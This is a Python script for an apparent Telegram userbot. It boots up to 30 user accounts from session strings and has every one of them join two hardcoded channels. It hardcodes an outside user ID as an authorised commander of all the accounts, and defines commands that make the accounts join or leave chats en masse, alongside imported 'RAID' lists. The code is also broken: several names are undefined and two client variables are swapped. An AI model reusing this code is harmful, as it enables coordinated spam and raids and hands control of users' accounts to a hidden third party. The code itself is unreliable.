import os
import sys
import random
from datetime import datetime
from os import execl
from telethon import TelegramClient, event
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest
from Config import STRING, SUDO, BIO_MESSAGE, API_ID, API_HASH, STRING2, STRING3, STRING4 ,STRING5, STRING6, STRING7, STRING8 ,STRING9, STRING10, STRING11, STRING12, STRING13, STRING14, STRING15, STRING16, STRING17, STRING18, STRING19, STRING20, STRING21, STRING22, STRING23, STRING24, STRING25, STRING26, STRING27, STRING28, STRING29, STRING30
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from Utils import RAID, RRAID



a = API_ID
b = API_HASH
smex = STRING
smexx = STRING2
smexxx = STRING3
smexxxx = STRING4
smexxxxx = STRING5
sixth = STRING6
seven = STRING7
eight = STRING8
ninth = STRING9
tenth = STRING10
eleventh = STRING11
twelve = STRING12
thirteen = STRING13
fourteen  = STRING14
fifteen = STRING15
sixteen = STRING16
seventeen = STRING17
eighteen = STRING18
nineteen = STRING19
twenty = STRING20
twentyone = STRING21
twentytwo = STRING22
twentythree = STRING23
twentyfour = STRING24
twentyfive = STRING25
twentysix = STRING26
twentyseven = STRING27
twentyeight = STRING28
twentynine = STRING29
thirty = STRING30


str1 = ""
str2 = ""
str3 = ""
str5 = ""
str4 = ""
str6 = ""
str7 = ""
str8 = ""
str9 = ""
str10 = ""
str11 = ""
str12 = ""
str13 = ""
str14 = ""
str15 = ""
str16 = ""
str17 = ""
str18 = ""
str19 = ""
str20 = ""
str21 = ""
str22 = ""
str23 = ""
str24 = ""
str25 = ""
str26 = ""
str27 = ""
str28 = ""
str29 = ""
str30 = ""


que = {}

SMEX_USERS = [658876201]
for x in SUDO:
    SMEX_USERS.append(x)
    
async def start_yukki():
    global str1
    global str2
    global str3
    global str5
    global str4
    global str6
    global str7
    global str8
    global str9
    global str10
    global str11
    global str12
    global str13
    global str14
    global str15
    global str16
    global str17
    global str18
    global str19
    global str20
    global str21
    global str22
    global str23
    global str24
    global str25
    global str26
    global str27
    global str28
    global str29
    global str30
    if smex:
        session_name = str(smex)
        print("String 1 Found")
        str1 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 1")
            await str1.start()
            botme = await str1.get_me()
            await str1(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str1(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            str1 = "smex"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "startup"
        str1 = TelegramClient(session_name, a, b)
        try:
            await str1.start()
        except Exception as e:
            pass
   
    if smexx:
        session_name = str(smexx)
        print("String 2 Found")
        str2 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 2")
            await str2.start()
            await str2(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str2(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "startup"
        str2 = TelegramClient(session_name, a, b)
        try:
            await str2.start()
        except Exception as e:
            pass

    if smexxx:
        session_name = str(smexxx)
        print("String 3 Found")
        str3 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 3")
            await  str3.start()
            await str3(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str3(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "startup"
        str3 = TelegramClient(session_name, a, b)
        try:
            await str3.start()
        except Exception as e:
            pass

    if smexxxx:
        session_name = str(smexxxx)
        print("String 4 Found")
        str4 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 4")
            await str4.start()
            await str4(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str4(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "startup"
        str4 = TelegramClient(session_name, a, b)
        try:
            await str4.start()
        except Exception as e:
            pass

    if smexxxxx:
        session_name = str(smexxxxx)
        print("String 5 Found")
        str5 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 5")
            await str5.start()
            await str5(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str5(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "startup"
        str5 = TelegramClient(session_name, a, b)
        try:
            await str5.start()
        except Exception as e:
            pass
                  
    if sixth:
        session_name = str(sixth)
        print("String 6 Found")
        str6 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 6")
            await str6.start()
            await str6(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str6(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "startup"
        str6 = TelegramClient(session_name, a, b)
        try:
            await str6.start()
        except Exception as e:
            pass

    if seven:
        session_name = str(seven)
        print("String 7 Found")
        str7 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 7")
            await str7.start()
            await str7(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str7(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "startup"
        str7 = TelegramClient(session_name, a, b)
        try:
            await str7.start()
        except Exception as e:
            pass    
        
    
    if eight:
        session_name = str(eight)
        print("String 8 Found")
        str8 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 8")
            await str8.start()
            await str8(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str8(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "startup"
        str8 = TelegramClient(session_name, a, b)
        try:
            await str8.start()
        except Exception as e:
            pass   
        
    if ninth:
        session_name = str(ninth)
        print("String 9 Found")
        str10 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 9")
            await str10.start()
            await str10(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str10(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "startup"
        str10 = TelegramClient(session_name, a, b)
        try:
            await str10.start()
        except Exception as e:
            pass   
    
  
    if tenth:
        session_name = str(tenth)
        print("String 10 Found")
        str9 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 10")
            await str9.start()
            await str9(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str9(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "startup"
        str9 = TelegramClient(session_name, a, b)
        try:
            await str9.start()
        except Exception as e:
            pass 
    if eleventh:
        session_name = str(eleventh)
        print("String 11 Found")
        str11 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 11")
            await str11.start()
            botme = await str11.get_me()
            await str11(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str11(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            str11 = "eleventh"
            print(e)
            pass
    else:
        print("Session 11 not Found")
        session_name = "startup"
        str11 = TelegramClient(session_name, a, b)
        try:
            await str11.start()
        except Exception as e:
            pass
   
    if twelve:
        session_name = str(twelve)
        print("String 12 Found")
        str12 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 12")
            await str12.start()
            await str12(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str12(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = "startup"
        str12 = TelegramClient(session_name, a, b)
        try:
            await str12.start()
        except Exception as e:
            pass

    if thirteen:
        session_name = str(thirteen)
        print("String 13 Found")
        str13 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 13")
            await  str13.start()
            await str13(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str13(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = "startup"
        str13 = TelegramClient(session_name, a, b)
        try:
            await str13.start()
        except Exception as e:
            pass

    if fourteen:
        session_name = str(fourteen)
        print("String 14 Found")
        str14 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 14")
            await str14.start()
            await str14(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str14(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = "startup"
        str14 = TelegramClient(session_name, a, b)
        try:
            await str14.start()
        except Exception as e:
            pass

    if fifteen:
        session_name = str(fifteen)
        print("String 15 Found")
        str15 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 15")
            await str15.start()
            await str15(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str15(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "startup"
        str15 = TelegramClient(session_name, a, b)
        try:
            await str15.start()
        except Exception as e:
            pass
                  
    if sixteen:
        session_name = str(sixteen)
        print("String 16 Found")
        str16 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 16")
            await str16.start()
            await str16(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str16(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str16.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        pass
        session_name = "startup"
        str16 = TelegramClient(session_name, a, b)
        try:
            await str16.start()
        except Exception as e:
            pass

    if seventeen:
        session_name = str(seventeen)
        print("String 17 Found")
        str17 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 17")
            await str17.start()
            await str17(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str17(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str17.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        pass
        session_name = "startup"
        str17 = TelegramClient(session_name, a, b)
        try:
            await str17.start()
        except Exception as e:
            pass    
        
    
    if eighteen:
        session_name = str(eighteen)
        print("String 18 Found")
        str18 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 18")
            await str18.start()
            await str18(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str18(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str18.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        pass
        session_name = "startup"
        str18 = TelegramClient(session_name, a, b)
        try:
            await str18.start()
        except Exception as e:
            pass   
        
    if nineteen:
        session_name = str(nineteen)
        print("String 19 Found")
        str19 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 19")
            await str19.start()
            await str19(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str19(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str19.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        pass
        session_name = "startup"
        str19 = TelegramClient(session_name, a, b)
        try:
            await str19.start()
        except Exception as e:
            pass   
        
    
  
    if twenty:
        session_name = str(twenty)
        print("String 20 Found")
        str20 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 20")
            await str20.start()
            await str20(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str20(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str20.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        pass
        session_name = "startup"
        str20 = TelegramClient(session_name, a, b)
        try:
            await str20.start()
        except Exception as e:
            pass   
        

    if twentyone:
        session_name = str(twentyone)
        print("String 21 Found")
        str21 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 21")
            await str21.start()
            botme = await str21.get_me()
            await str21(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str21(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            str21 = "twentyone"
            print(e)
            pass
    else:
        print("Session 21 not Found")
        session_name = "startup"
        str21 = TelegramClient(session_name, a, b)
        try:
            await str21.start()
        except Exception as e:
            pass
   
    if twentytwo:
        session_name = str(twentytwo)
        print("String 22 Found")
        str22 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 22")
            await str22.start()
            await str22(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str22(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str22.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        pass
        session_name = "startup"
        str22 = TelegramClient(session_name, a, b)
        try:
            await str22.start()
        except Exception as e:
            pass

    if twentythree:
        session_name = str(twentythree)
        print("String 23 Found")
        str23 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 23")
            await  str23.start()
            await str23(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str23(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str23.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        pass
        session_name = "startup"
        str23 = TelegramClient(session_name, a, b)
        try:
            await str23.start()
        except Exception as e:
            pass

    if twentyfour:
        session_name = str(twentyfour)
        print("String 24 Found")
        str24 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 24")
            await str24.start()
            await str24(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str24(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str24.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        pass
        session_name = "startup"
        str24 = TelegramClient(session_name, a, b)
        try:
            await str24.start()
        except Exception as e:
            pass

    if twentyfive:
        session_name = str(twentyfive)
        print("String 25 Found")
        str25 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 25")
            await str25.start()
            await str25(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str25(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str25.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        pass
        session_name = "startup"
        str25 = TelegramClient(session_name, a, b)
        try:
            await str25.start()
        except Exception as e:
            pass
                  
    if twentysix:
        session_name = str(twentysix)
        print("String 26 Found")
        str26 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 26")
            await str26.start()
            await str26(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str26(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str26.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 not Found")
        pass
        session_name = "startup"
        str26 = TelegramClient(session_name, a, b)
        try:
            await str26.start()
        except Exception as e:
            pass

    if twentyseven:
        session_name = str(twentyseven)
        print("String 27 Found")
        str27 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 27")
            await str27.start()
            await str27(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str27(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str27.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 not Found")
        pass
        session_name = "startup"
        str27 = TelegramClient(session_name, a, b)
        try:
            await str27.start()
        except Exception as e:
            pass    
        
    
    if twentyeight:
        session_name = str(twentyeight)
        print("String 28 Found")
        str28 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 28")
            await str28.start()
            await str28(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str28(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str28.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 not Found")
        pass
        session_name = "startup"
        str28 = TelegramClient(session_name, a, b)
        try:
            await str28.start()
        except Exception as e:
            pass   
        
    if twentynine:
        session_name = str(twentynine)
        print("String 29 Found")
        str29 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 29")
            await str29.start()
            await str29(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str29(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str29.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 not Found")
        pass
        session_name = "startup"
        str29 = TelegramClient(session_name, a, b)
        try:
            await str29.start()
        except Exception as e:
            pass   
        
    
  
    if thirty:
        session_name = str(thirty)
        print("String 30 Found")
        str30 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 30")
            await str30.start()
            await str30(functions.channels.JoinChannelRequest(channel="@heeeeelllloooo"))
            await str30(functions.channels.JoinChannelRequest(channel="@luami_cifer"))
            botme = await str30.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 not Found")
        pass
        session_name = "startup"
        str30 = TelegramClient(session_name, a, b)
        try:
            await str30.start()
        except Exception as e:
            pass 




loop = asyncio.get_event_loop()
loop.run_until_complete(start_yukki())       

async def gifspam(e, smex):
    try:
        await e.client(
            functions.messages.SaveGifRequest(
                id=types.InputDocument(
                    id=sandy.media.document.id,
                    access_hash=smex.media.document.access_hash,
                    file_reference=smex.media.document.file_reference,
                ),
                unsave=True,
            )
        )
    except Exception as e:
        pass




        

async def get_user(event):
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        if previous_message.forward:
            replied_user = await event.client(
                GetFullUserRequest(previous_message.forward.sender_id)
            )
        else:
            replied_user = await event.client(
                GetFullUserRequest(previous_message.sender_id)
            )
    target = replied_user.user.id
    return target



@str1.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str6.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str7.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str8.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str9.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str10.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str11.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str12.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str13.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str14.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str15.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str16.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str17.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str18.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str19.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str20.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str21.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str22.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str23.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str24.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str25.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str26.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str27.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str28.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str29.on(events.NewMessage(incoming=True, pattern=r"\.advik"))
@str30.on(events.NewMessage(incoming=True, pattern=r"\.advik"))       
async def _(e):
    usage = "**HAPPY BIRTHDAY FUTU** 〄\n\n【﻿×××𝗝𝗼𝗶𝗻×××】\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n\n.join <Public Channel or Group Link/Username>"
    if e.sender_id in SMEX_USERS:
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 6:
            bc = yukki[0]
            text = "aa gaya....."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await e.client(functions.channels.JoinChannelRequest(channel=bc))
                await event.edit("𝚂𝚄𝙲𝙲𝙴𝚂𝙵𝚄𝙻𝙻𝚈 𝙹𝙾𝙸𝙽𝙴𝙳 !!!\n••••[×]   **HAPPY BIRTHDAY FUTU**")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
@str1.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str6.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str7.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str8.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str9.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str10.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str11.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str12.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str13.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str14.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str15.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str16.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str17.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str18.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str19.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str20.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str21.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str22.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str23.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str24.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str25.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str26.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str27.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str28.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str29.on(events.NewMessage(incoming=True, pattern=r"\.pp"))
@str30.on(events.NewMessage(incoming=True, pattern=r"\.pp"))        
async def _(e):
    usage = "**HAPPY BIRTHDAY FUTU**\n\n【﻿×××𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻×××】\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
    if e.sender_id in SMEX_USERS:
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = yukki[0]
            text = "aa gaya..."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await e.client(ImportChatInviteRequest(bc))
                await event.edit("𝚂𝚄𝙲𝙲𝙴𝚂𝙵𝚄𝙻𝙻𝚈 𝙹𝙾𝙸𝙽𝙴𝙳 !!!\n••••[×]  **HAPPY BIRTHDAY FUTU**")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
        
@str1.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str6.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str7.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str8.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str9.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str10.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str11.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str12.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str13.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str14.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str15.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str16.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str17.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str18.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str19.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str20.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str21.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str22.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str23.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str24.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str25.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str26.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str27.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str28.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str29.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))
@str30.on(events.NewMessage(incoming=True, pattern=r"\.jiya"))       
async def _(e):
    usage = "**BIRTHDAY PARTY ENDED**\n\n【﻿×××𝗟𝗲𝗮𝘃𝗲×××】\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n\n.leave <Channel or Chat ID>"
    if e.sender_id in SMEX_USERS:
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = yukki[0]
            bc = int(bc)
            text = "JA RAHA HU N CHILLATA KYA HAI..."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit("𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙻𝙴𝙵𝚃 !!\n          **BIRTHDAY PARTY ENDED**")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
                
        
        




